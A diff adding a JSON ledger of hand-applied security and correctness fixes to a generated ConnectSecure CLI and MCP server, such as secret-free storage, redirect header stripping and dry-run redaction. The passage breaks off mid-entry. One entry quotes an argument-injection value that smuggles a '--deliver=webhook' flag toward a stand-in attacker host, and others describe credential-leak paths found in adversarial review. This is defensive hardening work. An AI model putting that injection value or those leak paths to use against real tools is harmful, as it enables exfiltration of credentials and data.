@@ -1,0 +1,1333 @@
+{
+ "slug": "connectsecure",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Edits inside GENERATED files and onboard-regenerated docs. Whole hand-authored files (internal/cli/connectsecure_*.go, the seven novel command files, internal/cliutil/connectsecure_secrets.go, internal/store/connectsecure_secrets.go, internal/client/connectsecure_nocache.go) survive regen by construction. The cli/ entries are also recorded in the press library's .printing-press-patches/.",
+ "handfixes": [
+  {
+   "id": "orphan-index-on-array-id-fields",
+   "status": "active",
+   "summary": "No CREATE INDEX may name a column its table lacks; array-typed *_id fields (asset_view.unique_id, report_queries.suppression_id) never become columns.",
+   "why": "SQLite accepts the index as a string-literal expression, but ALTER TABLE DROP COLUMN then fails ('no such column'), failing the generated MCP checkpoint test and generate --validate.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "idx_asset_view_unique_id"
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "idx_report_queries_suppression_id"
+    }
+   ]
+  },
+  {
+   "id": "curated-default-sync",
+   "status": "active",
+   "summary": "defaultSyncResources() delegates to connectsecureDefaultSyncResources() (the curated core set).",
+   "why": "The generated default synced all 137 listable resources on a bare sync, including credential and integration-secret endpoints. The generated `sync --help` example also labelled a bare sync '# Sync all resources'; it now says it syncs the curated default set (adversarial round 15).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "return connectsecureDefaultSyncResources()"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "# Sync the curated default resources (name others with --resources)"
+    }
+   ]
+  },
+  {
+   "id": "secret-resources-never-persisted",
+   "status": "active",
+   "summary": "Credential and integration-secret rows, scheduled jobs (whose rows carry a password field), integration rules (integration_params), attack-surface results (creds and hashes fields), custom domains (undocumented cert_details) and the agent uninstall secret never reach the local store, the HTTP response cache, or auto-refresh.",
+   "why": "Those responses carry credential params or a password in plaintext; write-through, auto-refresh and the response cache would persist them under the CLI's data and cache dirs. Scheduler was added at onboard (2026-10-13) after the fresh-context review found the vendor spec's /r/company/scheduler GET returns a password field on every row: proven both directions against a mock serving a sentinel password - the pre-fix binary wrote it to cache/http and the SQLite store on a plain `scheduler list`, the fixed binary writes it nowhere. Codex review then found the typed writer upsertSchedulerTx still wrote the password column via UpsertScheduler (sync's single-object path) because only the generic resources insert was guarded; it is now guarded like upsertCredentialsTx, and TestSecretTypedWritersAreGuarded failed before the guard and passes after. Adversarial round 4 (2026-10-14) served sentinels in attack_surface_results.creds and integration_rules.integration_params on a mock pod and found each in the SQLite store, the HTTP cache and search; both resources were added to the list, their typed writers guarded, their auto-refresh entries removed, and TestSecretTypedWritersAreGuarded failed with the list entries removed and passes with them. Adversarial round 5 (2026-10-14) found custom_domains.cert_details is an undeclared object while custom-domains create uploads the TLS private key; with no live tenant to check what the GET echoes, custom_domains is treated as secret (store, cache and auto-refresh), and TestConnectsecureSecretTable plus TestConnectsecureDefaultSyncIsKnownAndSafe pin it. Codex round 5 then found upsertCustomDomainsTx unguarded (sync's refusal masked it); it is guarded and in TestSecretTypedWritersAreGuarded, which fails with the guard removed. Codex round 14 / adversarial round 14 (2026-10-14): the MCP context tool still listed the never-stored resources as syncable and searchable; handleContextResult now clears both for every store.NeverStoreResource name. TestContextDoesNotAdvertiseSecretResourcesAsSyncable fails with tools.go reverted.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if NeverStoreResource(",
+     "min_count": 9
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if connectsecureNoCachePath(path)",
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "not_contains": "{\"credentials\"}"
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "not_contains": "{\"scheduler\"}"
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_secrets.go",
+     "contains": "{\"scheduler\", \"/r/company/scheduler\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "scheduler rows carry a password field",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/connectsecure_secrets_test.go",
+     "contains": "func TestSecretTypedWritersAreGuarded(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_secrets.go",
+     "contains": "{\"attack_surface_results\", \"/r/company/attack_surface_results\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_secrets.go",
+     "contains": "{\"integration_rules\", \"/r/integration/integration_rules\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "not_contains": "{\"attack_surface_results\"}"
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "not_contains": "{\"integration_rules\"}"
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "attack-surface rows carry creds and hashes",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "integration rules carry integration_params",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cliutil/connectsecure_secrets.go",
+     "contains": "{\"custom_domains\", \"/r/company/custom_domains\"},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "not_contains": "{\"custom_domains\"}"
+    },
+    {
+     "file": "cli/internal/store/upsert_batch_test.go",
+     "contains": "custom-domain cert_details is undocumented",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/store/connectsecure_secrets_test.go",
+     "contains": "\"custom_domains\":          s.UpsertCustomDomains,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "if name, _ := r[\"name\"].(string); store.NeverStoreResource(name) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/connectsecure_context_test.go",
+     "contains": "func TestContextDoesNotAdvertiseSecretResourcesAsSyncable(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-status-counts-mint-credentials",
+   "status": "active",
+   "summary": "auth status treats CONNECTSECURE_TENANT + CLIENT_ID + CLIENT_SECRET as configured auth.",
+   "why": "The JWT is minted at runtime from those values, so a stored-token-only check reports a working setup as unauthenticated (exit 4).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "connectsecureMintConfigured(cfg)"
+    }
+   ]
+  },
+  {
+   "id": "local-read-r-route-prefix",
+   "status": "active",
+   "summary": "Local reads treat the leading /r/ of ConnectSecure read paths as a route prefix.",
+   "why": "Otherwise /r/company/companies is read as companies under parent r=company and every --data-source local read (and the auto offline fallback) returns no rows.",
+   "spec_encode_followup": "Press retro: make the route-prefix list spec-configurable or detect single-letter verb prefixes.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "\"private\", \"r\":"
+    }
+   ]
+  },
+  {
+   "id": "brand-casing-in-root-help",
+   "status": "active",
+   "summary": "Root help says ConnectSecure CLI.",
+   "why": "The template title-cases the slug instead of using the display name.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "ConnectSecure CLI"
+    }
+   ]
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. (1 guarded call site(s); the ledger requires all of them.)",
+   "why": "The press 4.33.5 recipe tool which_clients_does_this_cve_hit appends its `slug` tool-call argument as a positional AHEAD of the recipe's own flags with no flag-like check, so {\"slug\": \"--deliver=webhook:https://attacker/\"} became `cve-impact --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root --deliver flag. Proven both directions at onboard (2026-10-13): the new RejectsFlagLikePositional test FAILED against the unfixed handler (recorder showed `cve-impact --deliver=webhook:https://x/ --agent`) and passes with the fix, and the real connectsecure-mcp binary over stdio now returns `flag-like value ... not allowed for slug`. Same defect and fix as skills/acronis and skills/avanan (found by Codex adversarial review of the fleet mcp-argv-value-joined backport, 2026-09-09). cliArgsFromMCP in this print already emits joined --k=v values (press carries upstream #4647), but the recipe path is still unguarded in press 4.33.5, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "not_contains": "\"--\"+name, selected"
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "func rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if err := rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "RejectsFlagLikePositional(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "manifest-clean-mcp-binary-name",
+   "summary": "manifest.json name/entry_point/command use the clean `connectsecure-mcp`, not the press `-pp-mcp`",
+   "why": "onboard.py re-copies the SOURCE manifest.json on every --resume; the printing-press source keeps `connectsecure-pp-mcp`, which names a binary the .mcpb bundle does not contain. The repo ships `connectsecure-mcp`.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "connectsecure-mcp",
+     "min_count": 2
+    },
+    {
+     "file": "manifest.json",
+     "not_contains": "connectsecure-pp-mcp"
+    }
+   ]
+  },
+  {
+   "id": "install-credentials-declared-on-every-channel",
+   "summary": "The per-tenant pod URL (CONNECTSECURE_BASE_URL) plus the tenant, client ID and client secret that mint the token are declared, and required, on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md; optional variables are blank, not placeholders, in mcp-install.md.",
+   "why": "ConnectSecure hosts each tenant on its own pod (https://pod<N>.myconnectsecure.com) and config.go's default base URL (your-pod.myconnectsecure.com) is a non-functional placeholder, but the press derives the install prompts from auth_env_vars only, so the generated manifest asked only for an optional access token plus optional tenant/client fields and never for the pod URL - the .mcpb install could not work. Same class as hudu's per-instance-base-url-completed and issue #282. mcp-install.md's optional variables are emptied because a copied placeholder CONNECTSECURE_ACCESS_TOKEN is opaque, is treated as a live pre-minted token, and wins over minting from the client credentials, so every call would 401. manifest.json, server.json and mcp-install.md are all regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this entry a regeneration silently drops the pod URL again while check_env_schema stays green only if all three drop it together.",
+   "status": "active",
+   "spec_encode_followup": "cli-printing-press should carry every required non-secret config var (the per-tenant base URL) into user_config + mcp env + docs, and emit blank values for optional variables in copy-paste env blocks.",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTSECURE_BASE_URL\": \"${user_config.connectsecure_base_url}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTSECURE_TENANT\": \"${user_config.connectsecure_tenant}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTSECURE_CLIENT_ID\": \"${user_config.connectsecure_client_id}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"CONNECTSECURE_CLIENT_SECRET\": \"${user_config.connectsecure_client_secret}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTSECURE_BASE_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTSECURE_TENANT\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTSECURE_CLIENT_ID\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"CONNECTSECURE_CLIENT_SECRET\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_BASE_URL\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_TENANT\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_CLIENT_ID\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_CLIENT_SECRET\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"CONNECTSECURE_ACCESS_TOKEN\": \"\"",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "not_contains": "<your-connectsecure_access_token>"
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"required\": true",
+     "min_count": 4
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "is mandatory in HTTP mode",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "Open the Command Palette > **MCP: Open User Configuration** and add the block below.",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "skill-md-agent-safety-section",
+   "summary": "SKILL.md carries a 'Safety for agents' section naming the credential reads, the endpoint-affecting writes and CONNECTSECURE_MCP_READ_ONLY, and its description leads with 'Use when the user asks to'.",
+   "why": "onboard.py re-vendors SKILL.md from the press source on every --resume. The generated SKILL.md never tells an agent that credentials list/get, integration-credentials list/get and agents uninstall-secret return stored secrets in plaintext, that patching patch-now and companies scan act on client machines, or that the MCP server has a read-only switch - an agent reading only SKILL.md would treat them as ordinary reads and writes.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "SKILL.md",
+     "contains": "## Safety for agents",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "CONNECTSECURE_MCP_READ_ONLY=1",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "description: \"Use when the user asks to",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "scheduled jobs (`scheduler`, whose rows carry a password field)",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "Refresh the mirror with `sync --full`",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "contains": "Refresh later with --full",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "pass the JSON body on stdin with `--stdin`",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "`qbr` and `cve-impact` print their report object at the top level unless `--agent`",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "attack-surface results (`attack-surface-results`, whose rows carry creds and hashes fields)",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "contains": "attack-surface results (`attack-surface-results`, whose rows carry creds and hashes fields)",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "MCP tools also never take a local file path for the CLI to read",
+     "code_only": false
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "`agent-discoverysettings-mapping` and `attack-surface-domain` `create` / `update` change what gets scanned and reported",
+     "code_only": false
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "wrapped as `{\"data\": {...}}`",
+     "code_only": false
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "the store `data-<hash>.db`",
+     "code_only": false
+    },
+    {
+     "file": "guide.md",
+     "contains": "the store `data-<hash>.db`",
+     "code_only": false
+    },
+    {
+     "file": "guide.md",
+     "contains": "wrapped as `{\"data\": {...}}`",
+     "code_only": false
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "`patching patch-now` (alias `patching create`)",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "`agents reset` (alias `agents create`)",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "workflow-archive-skips-secret-resources",
+   "summary": "workflow archive drops secret-bearing resources (cliutil.ConnectsecureSecretResource) from its resource list before syncing.",
+   "why": "The generated archive list names every listable resource, including credentials, integration_credentials and scheduler. The store refuses those rows (secret-resources-never-persisted), which syncResource reports as an integrity failure, and archive aborts the whole run on the first one: on a mock pod the pre-fix binary exited 1 at `credentials`, so every resource alphabetically after it was never archived. The workflow_archive MCP tool exposes the same command.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "contains": "if !cliutil.ConnectsecureSecretResource(r) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "exposure-help-vendor-claim",
+   "summary": "exposure --help and the MCP context tool's exposure rationale/insight say the per-client vulnerability report lists assets only by ID, not that it lacks client names.",
+   "why": "The press-library novel text said ConnectSecure's vulnerability reports 'carry asset IDs but not client names'. That is false: problems_summary_group_by_companies returns company_id and company_name on every row, and exposure.go reads the name from it. A false statement about the vendor's product does not ship. exposure.go is hand-authored and survives a reprint, but a re-onboard from the unchanged press library would bring the old sentence back. The same false sentence also lived in the generated MCP context tool (internal/mcp/tools.go, the command-mirror rationale and the playbook insight every MCP agent reads first); round-2 adversarial review caught that twin.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/exposure.go",
+     "not_contains": "carry asset IDs but not client names"
+    },
+    {
+     "file": "cli/internal/cli/exposure.go",
+     "contains": "lists affected assets only by ID",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "asset IDs but no client"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "lists affected assets only by ID",
+     "min_count": 2
+    }
+   ]
+  },
+  {
+   "id": "redirect-strips-client-auth-token",
+   "summary": "The generic client's CheckRedirect deletes Client-Auth-Token (with Authorization and X-USER-ID) when a redirect leaves the origin.",
+   "why": "Client-Auth-Token is base64(tenant + '+' + client_id + ':' + client_secret), a reversible encoding of the secret. `session` and the MCP connectsecure_execute session.authorize endpoint send it through the generated client, whose redirect policy stripped only Authorization and X-USER-ID; Go itself strips only Authorization and Cookie. Found by Codex review (2026-10-13). TestClientAuthTokenDroppedOnCrossOriginRedirect routes a 307 to a hostname-based off-origin server and FAILED before the fix (the server received \"SECRET\") and passes after. The CLI's own mint path (connectsecure_auth.go) already refuses redirects. Codex round 11 (2026-10-14): config-file credential headers (X-Api-Key, Authorization overrides) still rode a cross-origin redirect, and a same-origin hop from an ordinary read onto a credential path would cache or write-through credential rows under the original resource. Every isSecretHeader header is now dropped off-origin, and a redirect onto a connectsecureNoCachePath from any other path is refused. TestConfiguredSecretHeaderDroppedOnCrossOriginRedirect and TestRedirectOntoCredentialPathRefused fail with those pieces reverted (mutation run) and pass with them. Adversarial round 12 / Codex round 12 (2026-10-14): the name-based header check still forwarded a configured header with an innocuous name (X-CS-Signature) off-origin; every config-file header is now dropped on a cross-origin hop. TestConfiguredSecretHeaderDroppedOnCrossOriginRedirect carries one and fails with that loop removed.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "req.Header.Del(\"Client-Auth-Token\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestClientAuthTokenDroppedOnCrossOriginRedirect(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if connectsecureNoCachePath(req.URL.Path) && !connectsecureNoCachePath(via[0].URL.Path) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestConfiguredSecretHeaderDroppedOnCrossOriginRedirect(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestRedirectOntoCredentialPathRefused(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "for k := range c.Config.Headers {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "session-token-from-stdin",
+   "summary": "`session --client-auth-token -` reads the encoded token from stdin.",
+   "why": "The generated `session` command (POST /w/authorize) took the reversible base64 of tenant + client ID + client secret only as a flag value, so it landed in process arguments and shell history with no alternative. Found by Codex review (2026-10-13). Receipt on a mock pod: piping the token into the fixed binary with `--client-auth-token -` mints a JWT; the unfixed binary sends a literal '-' and gets 'Invalid client credentials'. The CLI mints its own token, so `session` is rarely needed.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/promoted_session.go",
+     "contains": "if flagClientAuthToken == \"-\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/promoted_session.go",
+     "contains": "pass - to read it from stdin",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "redirect-refuses-cross-origin-body",
+   "status": "active",
+   "summary": "CheckRedirect refuses a cross-origin redirect whenever the caller's original request was not GET or HEAD. On the same origin, a write answered with 301/302 (which Go replays as a bodiless GET) fails too; 303 is still followed.",
+   "why": "A 307/308 keeps the method and replays the body, and credentials, integration-credentials and scheduler writes carry passwords in the body; stripping headers alone (redirect-strips-client-auth-token) still sent the body to the other origin. Codex review 2026-10-14 confirmed a scheduler password reached another origin on a mock; TestWriteBodyNotReplayedCrossOrigin fails with the guard disabled and passes with it. Adversarial round 5 (2026-10-14) found 301/302/303 slipped past it: Go rewrites the POST into a bodiless GET before CheckRedirect runs, so the guard saw GET, the write never landed, and the CLI printed success:true. The check now reads via[0].Method; TestWriteNotDowngradedCrossOrigin fails for all three codes with req.Method and passes with via[0]. Adversarial round 6 found the same-origin 301/302 case still reported success:true with the GET body as data; TestWriteNotDowngradedSameOrigin fails for 301 and 302 with the check disabled and passes with it, and 303 stays followed. Adversarial round 7: checking via[0] failed a same-origin 303-then-302 chain whose write had landed; both checks now read the hop being redirected (via[len(via)-1]), and TestWriteRedirectChainChecksTheLastHop fails with via[0].",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "refusing to replay a %s request body to another origin",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteBodyNotReplayedCrossOrigin(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if m := via[len(via)-1].Method; m != http.MethodGet && m != http.MethodHead {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteNotDowngradedCrossOrigin(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "(req.Response.StatusCode == http.StatusMovedPermanently || req.Response.StatusCode == http.StatusFound) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteNotDowngradedSameOrigin(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redirect_test.go",
+     "contains": "func TestWriteRedirectChainChecksTheLastHop(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dry-run-redacts-secret-body",
+   "status": "active",
+   "summary": "--dry-run masks secret-named body fields (password, secret, token, params and similar) before printing the request preview.",
+   "why": "The generated dryRun printed the request body verbatim, so `scheduler create --stdin --dry-run` echoed the job password to stderr, where agent transcripts keep it (Codex review 2026-10-14). The redactor lives in the hand-authored internal/client/connectsecure_redact.go; TestDryRunRedactsSecretBody fails with the call removed and passes with it.",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "body = connectsecureRedactBody(body)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/connectsecure_redact_test.go",
+     "contains": "func TestDryRunRedactsSecretBody(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-verdict-tracks-reality",
+   "status": "active",
+   "summary": "doctor verifies the credential with an authenticated GET /r/company/companies?limit=1 instead of printing 'present, not verified'; a 404 there turns the api row red, and a failed token mint (which runs inside client init) is the credentials verdict.",
+   "why": "Measured by tools/maintainer/check_doctor_truth.py (issue #282). The 4.33.5 doctor failed that gate on this connector: 'present, not verified' in the healthy state, an HTML 200 at / read as a healthy API in the wrong-base state, and an identical credentials verdict whether the credential worked or not. After the fix the gate passes; it failed in the verify_all run before it. Codex round 11 (2026-10-14): an HTTP 200 that was not the status envelope (plaintext 'Access denied', a gateway page, {}) still read as valid; doctor now requires the status field. TestDoctorRequiresTheStatusEnvelope fails with the check reverted. Adversarial round 13 (2026-10-14): requiring the status field broke tools/maintainer/check_doctor_truth.py, whose healthy stub answers 200 {\"data\":[],\"items\":[],\"results\":[]}; doctor now verifies on status:true or, with no status, a data key, so {} and plaintext still fail and the gate passes (checked with --slug connectsecure). A 200 status:false now arrives as an APIError and lands in the 'ERROR rejected' branch. Codex round 14 / adversarial round 14 (2026-10-14): any `data` member counted ({\"data\":null} and a string read as valid); the data member must now be a JSON list.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorProbeCredentials(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorProbePath = \"/r/company/companies\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, reachErr, report)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "present, not verified. Run `%s %s`"
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "if json.Unmarshal(body, &env) != nil || (env.Status == nil && !bytes.HasPrefix(bytes.TrimSpace(env.Data), []byte(\"[\"))) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestDoctorRequiresTheStatusEnvelope(",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-full-refresh-guidance",
+   "status": "active",
+   "summary": "Every refresh hint the binary and MCP server give names `sync --full`: the stale-store hint, doctor's stale-cache hint, the sync help, the MCP no-match and store-error next steps, and the context tool's query tips.",
+   "why": "A bare re-sync only adds and updates rows; only --full prunes findings remediated since the last sync, so a bare refresh keeps reporting them as open in exposure and portfolio. Adversarial round 4 (2026-10-14) found the docs said --full while the binary's own stale hint, forwarded to MCP agents, still said a bare sync. Adversarial round 5 found doctor's stale-cache hint still said a bare sync, and the sync help still offered `--since 7d` as an incremental sync although this API has no temporal filter; both fixed.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync_hint.go",
+     "contains": "const syncHintCommand = \"connectsecure-cli sync --full\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "Short: \"Sync API data to local SQLite for offline search and analysis (refresh with --full)\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "re-run sync with --full if data may be stale",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "Refresh the local store with sync --full",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "run 'connectsecure-cli sync --full' to refresh.",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "Incremental sync: only records from the last 7 days"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "ConnectSecure has no time filter, so each resource warns and syncs in full",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-refuses-secret-resources",
+   "status": "active",
+   "summary": "sync refuses a secret resource (credentials, scheduler, custom_domains and the rest of the cliutil list) before any request, with a never-stored message, and doctor leaves those resources out of its staleness verdict.",
+   "why": "Adversarial round 5 (2026-10-14): `sync --resources credentials` downloaded the secret rows over the wire, discarded them, and reported a phantom all_items_failed_id_extraction anomaly that sends an agent debugging primary keys; the never-synced sync_state rows it left then kept doctor's cache check stale forever. TestSyncRefusesSecretResourcesBeforeFetching fails (fetches, then panics on the nil store) with the guard disabled and passes with it. Adversarial round 6 found the reason reached only --human-friendly output; machine modes now get a sync_error event with reason never_stored_by_design, which the test asserts.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if cliutil.ConnectsecureSecretResource(resource) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "if cliutil.ConnectsecureSecretResource(rtype) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/connectsecure_novel_test.go",
+     "contains": "func TestSyncRefusesSecretResourcesBeforeFetching(",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"reason\": \"never_stored_by_design\"",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-bool-false-default-true",
+   "status": "active",
+   "summary": "An explicit false on an MCP tool call reaches a bool flag whose default is true (tail --follow), as a joined --flag=false.",
